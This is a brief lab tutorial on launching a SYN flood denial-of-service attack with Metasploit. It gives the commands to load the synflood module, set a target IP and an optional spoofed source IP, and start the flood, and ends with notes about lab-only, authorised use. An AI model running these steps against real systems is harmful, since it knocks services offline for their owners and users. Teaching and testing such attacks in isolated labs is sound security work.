#### **1. Prepare Your Environment**

1. **Target Setup:**
    
    - Identify the target machine's IP address:
        
        ```bash
        ip a
        ```
        
    - Ensure the target machine is reachable from the attacking machine by pinging it:
        
        ```bash
        ping <Target_IP>
        ```
        
2. **Attacker Setup:**
    
    - Start Metasploit Framework:
        
        ```bash
        sudo msfconsole
        ```

#### **2. Configure the SYN Flood Module**

1. **Load the SYN Flood Module:**
    
    ```bash
    use auxiliary/dos/tcp/synflood
    ```
    
2. **View Available Options:**
    
    ```bash
    show options
    ```
    
    This displays all configurable parameters for the module.
    
3. **Set the Target IP Address (RHOST):**
    
    ```bash
    set RHOST <Target_IP>
    ```
    
    Replace `<Target_IP>` with the IP of the target machine.
    
4. **Optional: Set Source IP (Spoofing):** If you want to spoof the source IP address:
    
    ```bash
    set SHOST <Spoofed_IP>
    ```

#### **3. Launch the Attack**

1. **Start the SYN Flood:**
    
    ```bash
    exploit
    ```
    
    - This will start sending a flood of SYN packets to the target IP.
    - Monitor the attack output to see packet generation logs.

### **Notes and Considerations**

- **Use in Legal Scenarios:** Ensure you perform this attack only in a controlled lab setup or with explicit permission.
- **DoS vs. DDoS:** This method demonstrates a basic DoS attack. Real-world DDoS attacks typically involve multiple distributed sources.
- **Impact on Target:** A SYN flood can overwhelm the target's connection table, rendering it temporarily unavailable. Be cautious about the resource capacity of the target system.
- **Testing Environment:** Use virtualized setups (e.g., VirtualBox or VMware) with isolated networks to avoid unintended consequences.
